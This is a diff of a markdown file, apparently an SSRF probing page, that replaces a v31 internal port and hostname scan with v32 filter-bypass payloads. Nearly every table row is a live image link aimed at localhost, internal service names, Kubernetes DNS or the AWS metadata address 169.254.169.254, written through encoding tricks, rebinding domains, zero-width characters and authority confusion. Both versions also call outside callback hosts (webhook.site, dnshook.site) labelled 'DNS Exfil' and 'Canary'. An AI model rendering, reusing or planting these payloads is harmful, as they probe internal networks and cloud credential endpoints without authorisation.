@@ -1,129 +1,139 @@
-# Security Research - v31
+# Security Research - v32
 
-## Internal Port Scanning & Timing Attacks
+## Parser Differentials & Edge Cases
 
-Attempting to detect internal services via response timing and error behavior.
-
----
-
-### 1) Common Internal Ports via 127.0.0.1
-
-Testing if different ports produce different timing/errors:
-
-| Port | Service | Image |
-|------|---------|-------|
-| 22 | SSH | ![ssh](http://127.0.0.1:22/v31.gif) |
-| 80 | HTTP | ![http](http://127.0.0.1:80/v31.gif) |
-| 443 | HTTPS | ![https](http://127.0.0.1:443/v31.gif) |
-| 3306 | MySQL | ![mysql](http://127.0.0.1:3306/v31.gif) |
-| 5432 | PostgreSQL | ![postgres](http://127.0.0.1:5432/v31.gif) |
-| 6379 | Redis | ![redis](http://127.0.0.1:6379/v31.gif) |
-| 8080 | Alt HTTP | ![alt](http://127.0.0.1:8080/v31.gif) |
-| 9200 | Elasticsearch | ![elastic](http://127.0.0.1:9200/v31.gif) |
+Testing parser differences that might bypass URL validation.
 
 ---
 
-### 2) Common Internal Services via Hostnames
+### 1) Backslash vs Forward Slash
 
-| Host | Image |
-|------|-------|
-| localhost | ![localhost](http://localhost/v31.gif) |
-| localhost:8080 | ![localhost8080](http://localhost:8080/v31.gif) |
-| localhost:3000 | ![localhost3000](http://localhost:3000/v31.gif) |
-
----
-
-### 3) GitHub Internal Hostnames (Guessing)
-
-| Host | Image |
-|------|-------|
-| api | ![api](http://api/v31.gif) |
-| api.github.com | ![api-github](http://api.github.com/v31.gif) |
-| internal | ![internal](http://internal/v31.gif) |
-| proxy | ![proxy](http://proxy/v31.gif) |
-| cache | ![cache](http://cache/v31.gif) |
-| redis | ![redis-host](http://redis/v31.gif) |
-| db | ![db](http://db/v31.gif) |
-| mysql | ![mysql-host](http://mysql/v31.gif) |
-| postgres | ![postgres-host](http://postgres/v31.gif) |
-| consul | ![consul](http://consul/v31.gif) |
-| vault | ![vault](http://vault/v31.gif) |
-| kafka | ![kafka](http://kafka/v31.gif) |
-
----
-
-### 4) Docker/Kubernetes Internal DNS
-
-| Host | Image |
-|------|-------|
-| host.docker.internal | ![docker-host](http://host.docker.internal/v31.gif) |
-| kubernetes | ![k8s](http://kubernetes/v31.gif) |
-| kubernetes.default | ![k8s-default](http://kubernetes.default/v31.gif) |
-| kube-dns.kube-system | ![kube-dns](http://kube-dns.kube-system/v31.gif) |
-
----
-
-### 5) Common Sidecar/Mesh Services
-
-| Host | Image |
-|------|-------|
-| istio-proxy | ![istio](http://istio-proxy/v31.gif) |
-| envoy | ![envoy](http://envoy/v31.gif) |
-| linkerd-proxy | ![linkerd](http://linkerd-proxy/v31.gif) |
-
----
-
-### 6) IPv6 Variations
-
-| Address | Image |
-|---------|-------|
-| [::1] | ![ipv6-1](http://[::1]/v31.gif) |
-| [0:0:0:0:0:0:0:1] | ![ipv6-2](http://[0:0:0:0:0:0:0:1]/v31.gif) |
-| [::ffff:127.0.0.1] | ![ipv6-3](http://[::ffff:127.0.0.1]/v31.gif) |
-| [::ffff:7f00:1] | ![ipv6-4](http://[::ffff:7f00:1]/v31.gif) |
-
----
-
-### 7) Alternative Localhost Representations
-
-| Format | Image |
-|--------|-------|
-| 127.1 | ![127-1](http://127.1/v31.gif) |
-| 127.0.1 | ![127-0-1](http://127.0.1/v31.gif) |
-| 0x7f000001 | ![hex-full](http://0x7f000001/v31.gif) |
-| 2130706433 | ![decimal](http://2130706433/v31.gif) |
-| 017700000001 | ![octal](http://017700000001/v31.gif) |
-| 0177.0.0.01 | ![mixed-octal](http://0177.0.0.01/v31.gif) |
-
----
-
-### 8) Double URL Encoding
-
-| Encoding | Image |
-|----------|-------|
-| %31%32%37%2e%30%2e%30%2e%31 | ![encoded](http://%31%32%37%2e%30%2e%30%2e%31/v31.gif) |
-| %25%33%31%25%33%32%25%33%37 | ![double](http://%25%33%31%25%33%32%25%33%37/v31.gif) |
-
----
-
-### 9) URL Authority Confusion
+Some parsers treat backslashes as path separators:
 
 | URL | Image |
 |-----|-------|
-| //127.0.0.1/v31.gif | ![slash](//127.0.0.1/v31.gif) |
-| http://foo@127.0.0.1/v31.gif | ![auth](http://foo@127.0.0.1/v31.gif) |
-| http://foo:bar@127.0.0.1/v31.gif | ![userpass](http://foo:bar@127.0.0.1/v31.gif) |
+| http://webhook.site\\@127.0.0.1/v32.gif | ![1](http://webhook.site\@127.0.0.1/v32.gif) |
+| http://127.0.0.1\\@webhook.site/v32.gif | ![2](http://127.0.0.1\@webhook.site/v32.gif) |
+| http://foo\\x00.127.0.0.1/v32.gif | ![3](http://foo\x00.127.0.0.1/v32.gif) |
+
+---
+
+### 2) Unicode Normalization
+
+| Character | Image |
+|-----------|-------|
+| ①②⑦.⓪.⓪.① | ![u1](http://①②⑦.⓪.⓪.①/v32.gif) |
+| Ⅰ②⑦.0.0.1 | ![u2](http://Ⅰ②⑦.0.0.1/v32.gif) |
+
+---
+
+### 3) IPv4-in-IPv6 Notations
+
+| Format | Image |
+|--------|-------|
+| [::ffff:169.254.169.254] | ![4](http://[::ffff:169.254.169.254]/v32.gif) |
+| [0000:0000:0000:0000:0000:ffff:a9fe:a9fe] | ![5](http://[0000:0000:0000:0000:0000:ffff:a9fe:a9fe]/v32.gif) |
+
+---
+
+### 4) DNS Rebinding Services
+
+| Service | Image |
+|---------|-------|
+| make-127-0-0-1-rr.1u.ms | ![dns1](http://make-127-0-0-1-rr.1u.ms/v32.gif) |
+| 127.0.0.1.nip.io | ![dns2](http://127.0.0.1.nip.io/v32.gif) |
+| 127.0.0.1.xip.io | ![dns3](http://127.0.0.1.xip.io/v32.gif) |
+| 127-0-0-1.sslip.io | ![dns4](http://127-0-0-1.sslip.io/v32.gif) |
+| localtest.me | ![dns5](http://localtest.me/v32.gif) |
+| vcap.me | ![dns6](http://vcap.me/v32.gif) |
+
+---
+
+### 5) AWS Metadata via DNS
+
+| Service | Image |
+|---------|-------|
+| 169.254.169.254.nip.io | ![aws1](http://169.254.169.254.nip.io/latest/meta-data/) |
+| 169-254-169-254.sslip.io | ![aws2](http://169-254-169-254.sslip.io/latest/meta-data/) |
+
+---
+
+### 6) Fragment Identifier Bypass
+
+| URL | Image |
+|-----|-------|
+| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2#http://127.0.0.1/v32.gif | ![frag1](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2#http://127.0.0.1/v32.gif) |
+| https://13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site#@127.0.0.1/v32.gif | ![frag2](https://13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site#@127.0.0.1/v32.gif) |
+
+---
+
+### 7) Query String Confusion
+
+| URL | Image |
+|-----|-------|
+| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?url=http://127.0.0.1/v32.gif | ![q1](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?url=http://127.0.0.1/v32.gif) |
+| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?@127.0.0.1/v32.gif | ![q2](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?@127.0.0.1/v32.gif) |
+
+---
+
+### 8) Tab/Newline in URL
+
+| Description | Image |
+|-------------|-------|
+| Tab in host | ![t1](http://127	.0.0.1/v32.gif) |
+| Newline in host | ![t2](http://127%0a.0.0.1/v32.gif) |
+| CR in host | ![t3](http://127%0d.0.0.1/v32.gif) |
+
+---
+
+### 9) Rare TLDs that look like IPs
+
+| Domain | Image |
+|--------|-------|
+| 127.0.0.1.com | ![r1](http://127.0.0.1.com/v32.gif) |
+| 169.254.169.254.io | ![r2](http://169.254.169.254.io/v32.gif) |
+| internal.169.254.169.254.test | ![r3](http://internal.169.254.169.254.test/v32.gif) |
+
+---
+
+### 10) Zero-Width Characters
+
+| Description | Image |
+|-------------|-------|
+| ZWSP in host | ![z1](http://127​.0.0.1/v32.gif) |
+| ZWJ in host | ![z2](http://127‍.0.0.1/v32.gif) |
+| ZWNJ in host | ![z3](http://127‌.0.0.1/v32.gif) |
+
+---
+
+### 11) Punycode Variations
+
+| Domain | Image |
+|--------|-------|
+| xn--nxasmq5b (localhost IDN) | ![p1](http://xn--nxasmq5b/v32.gif) |
+| internal.xn--nxasmq5b | ![p2](http://internal.xn--nxasmq5b/v32.gif) |
+
+---
+
+### 12) Case Sensitivity
+
+| URL | Image |
+|-----|-------|
+| HTTP://127.0.0.1/v32.gif | ![c1](HTTP://127.0.0.1/v32.gif) |
+| Http://127.0.0.1/v32.gif | ![c2](Http://127.0.0.1/v32.gif) |
+| http://LOCALHOST/v32.gif | ![c3](http://LOCALHOST/v32.gif) |
+| http://LocalHost/v32.gif | ![c4](http://LocalHost/v32.gif) |
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v31-dns.70e0ef7c-2cbf-4956-abfc-1295860c6b54.dnshook.site/dns.gif)
+![dns](https://v32-dns.13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/70e0ef7c-2cbf-4956-abfc-1295860c6b54/v31-canary.gif)
+![canary](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2/v32-canary.gif)
 
 ---
 
-*v31 - Internal port scanning & timing attacks*
+*v32 - Parser differentials & edge cases*
